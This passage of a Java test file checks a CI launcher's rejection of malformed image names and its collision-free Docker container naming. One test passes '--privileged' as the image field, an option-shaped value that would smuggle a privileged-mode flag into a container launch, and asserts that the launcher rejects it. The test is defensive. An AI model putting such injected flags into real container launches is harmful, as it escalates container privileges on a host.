        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "cafebabe", "--privileged", "d", "s", "u", 0, false, "", Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(optionShapedImage));
    LaunchSpec blankImage =
        new LaunchSpec("run", 0, CiRepoRef.of("repo-1"), "main", "cafebabe", "  ", "d", "s", "u", 0, false, "", Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(blankImage));
  }

  @Test
  public void shortRunIdsStillNameAValidStableContainer() {
    // "Used whole" no longer literally holds -- a disambiguator now rides alongside even a runId
    // short enough to need no truncation, because containerName must not assume any runId shape.
    // What still holds: the hint stays readable, and the same input always names the same container.
    String name = CiDaemonLauncher.containerName("abc", 0);
    assertEquals("qits-ci-abc-17862-0", name);
    assertEquals(name, CiDaemonLauncher.containerName("abc", 0), "must be deterministic");
    assertTrue(name.matches("[a-zA-Z0-9][a-zA-Z0-9_.-]*"), "must stay inside docker's name charset");
  }

  @Test
  public void twoRunIdsSharingAnEightCharacterPrefixNeverCollide() {
    // The literal shape of today's incident: every probe runId used to be "daemon-probe-" + a UUID,
    // so the blind 8-character substring was always "daemon-p" and two concurrent probes always
    // named the same container. Both runIds below still share that same 8-character prefix; the
    // disambiguator -- derived from the WHOLE runId -- is what keeps their container names apart now.
    String a = CiDaemonLauncher.containerName("daemon-probe-11111111-1111-1111-1111-111111111111", 0);
    String b = CiDaemonLauncher.containerName("daemon-probe-22222222-2222-2222-2222-222222222222", 0);
    assertTrue(a.startsWith("qits-ci-daemon-p-"), a);
    assertTrue(b.startsWith("qits-ci-daemon-p-"), b);
    assertFalse(a.equals(b), "runIds sharing an 8-char prefix must still name different containers");
  }

  @Test
  public void twoFreshProbeRunIdsNeverCollide() {
    // The concrete case this incident hit, with CiDaemonContainerProbe's own (now bare-UUID) runId
    // generation: two distinct random UUIDs must not collide on the resulting container name. Not a
    // guarantee about UUID collisions in general -- just that containerName does not throw the
    // entropy away the way the old blind prefix did.
    String runIdA = java.util.UUID.randomUUID().toString();
    String runIdB = java.util.UUID.randomUUID().toString();
    assertFalse(runIdA.equals(runIdB), "test setup: the two random UUIDs must differ");
    assertFalse(
        CiDaemonLauncher.containerName(runIdA, 0).equals(CiDaemonLauncher.containerName(runIdB, 0)),
        "two distinct probe runIds must not collide on the container name");
  }

  // The docker-is-down WARN that used to live here went with the CLI it was about: there is no
  // `docker ps` to exit non-zero any more. Its successor is the boot reap's own patience window,
  // asserted in CiDaemonLauncherContainersTest against an orchestrator that answers nothing — the
  // same claim (a teardown that could not run says so and boots anyway) about the call that
  // replaced it.

  // The boot-time shape check that used to live here (daemonVersionComplaint) is gone with the
  // template flip: it warned only while the shipped template still addressed the binary by digest,
  // and it would have gone silent by construction the moment that stopped being true
  // (ci-daemon-autoadopt-plan.md §1.5). Its replacement, CiIdentifiers.requireDaemonVersion, is
  // enforced where a version now actually arrives untrusted — at adoption, in CiDaemonPinsTest —
  // rather than warned about at boot.
}
